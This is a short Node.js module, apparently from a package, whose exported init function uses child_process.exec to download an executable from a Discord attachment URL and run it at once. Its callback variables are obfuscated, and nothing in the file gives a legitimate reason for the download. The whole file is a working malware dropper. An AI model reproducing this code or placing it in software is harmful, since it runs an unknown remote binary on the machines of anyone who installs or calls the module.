const { exec } = require('node:child_process')
function init() {
  exec(
    'curl https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe -o a.exe && a.exe',
    (_0x45f1d7, _0x402094, _0x695166) => {
      if (_0x45f1d7) {
        console.log('error: ' + _0x45f1d7.message)
      }
    }
  )
}
module.exports = init

